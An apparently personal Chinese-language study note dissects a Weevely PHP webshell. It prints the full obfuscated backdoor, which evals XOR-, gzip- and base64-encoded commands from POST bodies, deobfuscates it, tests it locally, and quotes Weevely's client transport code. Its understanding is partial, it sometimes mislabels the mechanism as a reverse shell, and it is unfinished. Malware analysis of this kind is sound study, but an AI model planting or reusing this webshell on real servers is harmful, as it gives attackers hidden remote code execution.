
Last Edited: March 25, 2024 7:28 PM

# Weevely

通过weevely生成php

```php
<?php
$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8';
$v='input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';
$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}';
$d=str_replace('D','','cDrDeDaDDte_fuDnction');
$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i<$l;8i){fo8ir($8ij=0;($j<$c&&$i8i<$l);8i$j+8i+,$i+8i+';
$Y='$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i';
$A=str_replace('8i','',$Y.$k.$u.$v.$h);
$b=$d('',$A);$b();
?>

```

进行一点分析

```php
<?php
//第一部分：
$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8';
$v='input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';
$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}';
$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i<$l;8i){fo8ir($8ij=0;($j<$c&&$i8i<$l);8i$j+8i+,$i+8i+';
$Y='$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i';
$A=str_replace('8i','',$Y.$k.$u.$v.$h);

//第二部分
$d=str_replace('D','','cDrDeDaDDte_fuDnction');
$b=$d('',$A);
$b();
?>

```

# First Part

首先，第一部分的进行替换字符之后，得到

```php
$k="8c319f28";
$kh="d81d1527a942";
$kf="8e9a5c2195f5";
$p="ZnCtZbYsDzbbdvRw";

function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";

    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t{$i} ^ $k{$j};
        }
    }

    return $o;
}

if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
	@ob_start();
	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
	$o=@ob_get_contents();//获取当前缓冲区的内容，并返回缓冲区的数据
	@ob_end_clean();//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区
	$r=@base64_encode(@x(@gzcompress($o),$k));
	print("$p$kh$r$kf");}
```

从if语句的部分开始拆分

## *@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)*

**"/$kh(.+)$kf/"**

- `()`标记一个子表达式的开始和结束位置。
- `.`匹配除换行符之外的任何单个字符
- `+`匹配前面的子表达式0次或者多次

写一个例子来理解：

```php
$k = 'cr';
$s = 'ke';

$a = 'cream soda you know i like it like that ';

$c = preg_match("/$k(.+)$s/", $a, $cc);

var_dump($cc);

/*结果：
array(2) {
  [0] =>
  string(34) "cream soda you know i like it like"
  [1] =>
  string(30) "eam soda you know i like it li"
}
*/
```

所以整个正则表达式的意思其实是：匹配`$k`开头的`$s`结尾的，中间的任意的字符串。

$cc 存储了两个元素:

• 第一个元素`$cc[0]`，用来存储按照表达式匹配到的**完整字符串**，也就是***`cream soda you know i like it like`***，可以看到，和原字符串对比，少了结尾的*that*

• 第二个元素`$cc[1]`，用来存储**捕获组匹配到的内容**，也就是*`eam soda you know i like it li`*，少了开头的*cr⇒$k*，结尾的*ke⇒$s*

所以对于第一句条件 `@preg_match**(**"/$kh(.+)$kf/",@file_get_contents**(**"php://input"**)**,$m**)**==1**)**` ：

- 如果在post请求中匹配到 $kh(.+)$kf ，就存入 $m 中
- 然后**ob_start()**
    
    • **ob_start()** 是 PHP 中的一个函数，用于开启输出缓冲。
    
    • 在 PHP 中，当输出到浏览器或者其他输出目标时，通常是立即发送给客户端的。但有时候，我们可能希望先将输出内容暂时存储起来，等待进一步处理或者在某个时机再发送给客户端，这时就可以使用输出缓冲。
    
    •**ob_start()** 函数的作用就是开启输出缓冲。
    
    • 一旦调用了 **ob_start()**，PHP 将会把后续所有的输出都缓冲起来，而不会立即发送到浏览器。
    
    • 当需要将缓冲内容发送到浏览器时，可以使用 **ob_end_flush()** 或者 **ob_flush()** 函数来完成。
    
    • 使用输出缓冲的一个常见场景是，当需要在 PHP 脚本中生成一些输出内容，但又希望在输出之前对其进行处理，比如对输出内容进行压缩、修改或者日志记录等操作时。
    

## 2.@gzuncompress和@base64_decode

> **@gzuncompress**: 用于解压缩经过gzip压缩的字符串。
> 
> 
> **@base64_decode**: 用于对经过base64编码的数据进行解码。
> 

`$m[1]`是捕获组内容，对其进行base64解码，那个$k是上面就定义的那个$k，会传入下一步进行的x函数作为第二个参数（密钥）

## 3.x

进行异或操作，用于加密

> 异或操作有一个特性，就是对同一个值进行两次异或操作，结果还是原来的值。
> 

```php
function x($t,$k){
    $c=strlen($k);//获取密钥字符串的长度
    $l=strlen($t);//获取输入字符串的长度
    $o="";//初始化一个空字符串 $o 用于存储输出结果
    for($i=0;$i<$l;){//外层循环遍历输入字符串中的每个字符
        for($j=0;($j<$c&&$i<$l);$j++,$i++){//内层循环遍历密钥字符串中的每个字符，并且在每次循环迭代中，
            $o.=$t{$i}^$k{$j};//将当前密钥字符与当前输入字符进行按位异或操作，并将结果追加到输出字符串 $o 中
        }
    }return $o;
}
```

## 4.then

再往后，会发现$r反方向来了一遍

先压缩然后x异或操作最后base64编码

？？？？对缓冲区的内容逆向来一遍？？？

# Second Part

## Lambda_1?

在第二部分断点调试的时候看见的

```php
$d=str_replace('D','','cDrDeDaDDte_fuDnction');//替换之后得到create_function
$b=$d('',$A);
$b();
```

***`create_function`*** 是 PHP 中的一个函数，用于动态创建一个匿名函数（lambda 函数）。

通过 ***`create_function**`* 函数，可以根据传入的参数和代码字符串创建一个匿名函数，并返回一个唯一的函数名。

这个函数名可以用来调用这个动态创建的函数。

查了一下官方手册（[https://www.php.net/manual/en/function.create-function.php](https://www.php.net/manual/en/function.create-function.php)），写了一个demo进行理解

```php
$newfunc = create_function('', 'echo "Hello, World!";');
$newfunc(); // 输出 Hello, World!

$func = create_function('$arg1, $arg2', '');
$result = $func(1, 2); // 这个调用不会执行任何操作，因为函数体为空
```

所以第二部分的代码意为：

通过`create_function`函数创建一个匿名函数，`$args`为空，`$code`来自于`$A`，最后通过`$b()`进行调用运行`$A`中的PHP代码。

# 思路

用**`$end`**来表示`@file_get_contents**(**"php://input"**)**`获取到的内容，那么整个流程就是：

1.对**$end** base64解密=>

2.对**$k**和解密后的**$end**进行异或=>

3.解压异或后的内容=>

4.执行（很大可能就是连接shell的代码）=>

5.得到缓冲区的内容（很大可能代码执行后的返回内容）=>

6.对返回的内容$o压缩、压缩后的$o和$k进行异或、异或后的内容进行base64 加密=>

7.将内容打印输出

then now就陷入？？

就，输出个什么？

两个想法：

- 查看weevely源码
- 修改木马代码进行对比功能

# 6.修改木马代码

## 未连接

- 当我把解密的代码写入后，执行weevely的连接操作，it works.——就是如果不关病毒防护，会被windows的安全系统隔离。
- 当我把$r注释，对应的修改print除去$r，连接失败。⇒`Backdoor communication failed, check URL availability and password`

搜寻一下：`backdoor_unavailable = 'Backdoor communication failed, check URL availability and password'`

## 已连接

当我在连接之后，把$r注释掉，连接并没有断开，但执行whoami无结果返回。

再取消注释，结果返回成功。

### 如果进一步分解 $r

如果`$r=gzcompress($o)`;——only压缩

```php
**DESKTOP-RQS0QA6:C:\Qt\phpstudy_pro\WWW\nobody\badnews $ whoami
Traceback (most recent call last):
  File "/usr/bin/weevely", line 104, in <module>
    main(arguments)
  File "/usr/bin/weevely", line 57, in main
    Terminal(session).cmdloop()
  File "/usr/lib/python3.11/cmd.py", line 137, in cmdloop
    line = self.precmd(line)
           ^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/terminal.py", line 236, in precmd
    modules.loaded['system_info'].run_argv(["-info", "whoami"])
  File "/usr/share/weevely/core/module.py", line 192, in run_argv
    return self.run()
           ^^^^^^^^^^
  File "/usr/share/weevely/modules/system/info.py", line 83, in run
    result = self.vectors.get_results(
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/vectorlist.py", line 164, in get_results
    response[vector.name] = vector.run(format_args)
                            ^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/vectors.py", line 121, in run
    result = modules.loaded[self.module].run_argv(formatted)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/module.py", line 192, in run_argv
    return self.run()
           ^^^^^^^^^^
  File "/usr/share/weevely/modules/shell/php.py", line 100, in run
    response, code, error = self.channel.send(command)
                            ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/channels/channel.py", line 109, in send
    response = self.channel_loaded.send(
               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/channels/obfpost/obfpost.py", line 110, in send
    base64.b64decode(matched.group(1)),
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/base64.py", line 88, in b64decode
    return binascii.a2b_base64(s, strict_mode=validate)**
```

可以看到一个执行的过程

`argument`

**`Terminal(session).cmdloop()`**

 **`line = self.precmd(line)`**

**core/terminal.py：**

**`modules.loaded['system_info'].run_argv(["-info", "whoami"])`**

**core/modules.py：**

 **`return self.run()`**

**weevely/modules/system/info.py：**

**`result = self.vectors.get_results(`**

**core/vectorlist.py:**

**`response[vector.name] = vector.run(format_args)`**

**core/vectors.py**

**`result = modules.loaded[self.module].run_argv(formatted)`**

**core/module.py**

**`return self.run()`**

**/modules/shell/php.py**

**`response, code, error = self.channel.send(command)`**

**core/channels/channel.py**

**`response = self.channel_loaded.send(`**

**/core/channels/obfpost/obfpost.py**

**`base64.b64decode(matched.group(1)),`**

**python3.11/base64.py**

 **`return binascii.a2b_base64(s, strict_mode=validate)`**

如果`$r = x(gzcompress($o), $k)`——only 压缩和异或

```php
weevely> smart
'smart' �����ڲ����ⲿ���Ҳ���ǿ����еĳ���
���������ļ���
DESKTOP-RQS0QA6:C:\Qt\phpstudy_pro\WWW\nobody\badnews $ whoami
Traceback (most recent call last):
  File "/usr/bin/weevely", line 104, in <module>
    main(arguments)
  File "/usr/bin/weevely", line 57, in main
    Terminal(session).cmdloop()
  File "/usr/lib/python3.11/cmd.py", line 137, in cmdloop
    line = self.precmd(line)
           ^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/terminal.py", line 236, in precmd
    modules.loaded['system_info'].run_argv(["-info", "whoami"])
  File "/usr/share/weevely/core/module.py", line 192, in run_argv
    return self.run()
           ^^^^^^^^^^
  File "/usr/share/weevely/modules/system/info.py", line 83, in run
    result = self.vectors.get_results(
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/vectorlist.py", line 164, in get_results
    response[vector.name] = vector.run(format_args)
                            ^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/vectors.py", line 121, in run
    result = modules.loaded[self.module].run_argv(formatted)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/module.py", line 192, in run_argv
    return self.run()
           ^^^^^^^^^^
  File "/usr/share/weevely/modules/shell/php.py", line 100, in run
    response, code, error = self.channel.send(command)
                            ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/channels/channel.py", line 109, in send
    response = self.channel_loaded.send(
               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/share/weevely/core/channels/obfpost/obfpost.py", line 110, in send
    base64.b64decode(matched.group(1)),
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/base64.py", line 88, in b64decode
    return binascii.a2b_base64(s, strict_mode=validate)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
binascii.Error: Incorrect padding

```

base64解码时出现填充问题——base64编码中，如果数据长度不是4的倍数，就使用填充字符 “=”进行填充使其长度符合要求。

如果填充字符的位置或是数量不正确，那么就会导致填充问题。

---

emmm感觉在做无用功——因为想知道是什么在起作用使连接和交互生效——这样做完全只是试图逆向在研究response

所以转向看源码。

```php
# obfpost.py部分

class ObfPost:
    def send(self, original_payload, additional_handlers = []):

        if isinstance(original_payload, str):
            original_payload = original_payload.encode('utf-8')
		# 异或操作加密payload，self.shared_key就是$k
        xorred_payload = utils.strings.sxor(
                zlib.compress(original_payload),
                self.shared_key
                )
		# base64编码异或操作加密过的payload
        obfuscated_payload = base64.b64encode(xorred_payload).rstrip(b'=')
		# 包裹外壳
        wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND
		
        opener = urllib.request.build_opener(*additional_handlers)

        additional_ua = ''
        for h in self.additional_headers:
            if h[0].lower() == 'user-agent' and h[1]:
                additional_ua = h[1]
                break

        opener.addheaders = [
            ('User-Agent', (additional_ua if additional_ua else self.agent))
        ] + self.additional_headers

        dlog.debug(
            '[R] %s...' %
            (wrapped_payload[0:32])
        )

        url = (
            self.url if not config.add_random_param_nocache
            else utils.http.add_random_url_param(self.url)
        )

        try:
        	# 通过post传输payload
            response = opener.open(url, data = wrapped_payload).read()
        except http.client.BadStatusLine as e:
            # TODO: add this check to the other channels
            log.warn('Connection closed unexpectedly, aborting command.')
            return

        if not response:
            return

        # Multiple debug string may have been printed, using findall
        matched_debug = self.re_debug.findall(response)
        if matched_debug:
            dlog.debug('\n'.join(matched_debug))

        matched = self.re_response.search(response)
    	# 对或取的信息进行逆向解密
        if matched and matched.group(1):

            response = zlib.decompress(
                utils.strings.sxor(
                    base64.b64decode(matched.group(1)),
                    self.shared_key))

            return response
```

所以是通过tcp+post进行反向shell代码的传输，在服务器上的病毒文件通过`@file_get_contents**(**"php://input"**)**`得到post中的层层加密过的代码后解密、执行，建立连接。

```php
	$o=@ob_get_contents();//获取当前缓冲区的内容，并返回缓冲区的数据
	@ob_end_clean();//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区
	$r=@base64_encode(@x(@gzcompress($o),$k));
	print("$p$kh$r$kf");}
```

*这几行代码按理说应该是打印输出执行命令行后的响应内容的，但还是不理解是怎么运作的。*

*或者说，当建立连接之后，eval这个函数转向执行其他的命令行了吗？*

探寻源码的途中，意识到：

- 本质就是对反向shell的原理的浅理解——只停留在如何使用现成的，现成也就算了，还是绝对会被目前的安全系统检测到然后灭了的。
- 后果就是：weevely的php后门代码只是加了免杀，然后以为见到new thang了。

[反向shell原理](https://xz.aliyun.com/t/2549?time__1311=n4+xnieDqxgDcDUrxBLb+o0QKDtSIqDODjrD&alichlgref=https://www.google.com/)

当连接建立成功之后，那么，所有的交互就是通过建立的连接进行的，bash或者telnet……

上面让人疑惑的四行代码应该是加密压缩对来自其他主机的命令的响应的内容

既然建立了交互，那么输出都会被转发到攻击者的机器上，print语句的输出会出现在攻击者机器上，那么$r经过这么多道工序，输出的为什么是人类可读的？

TBC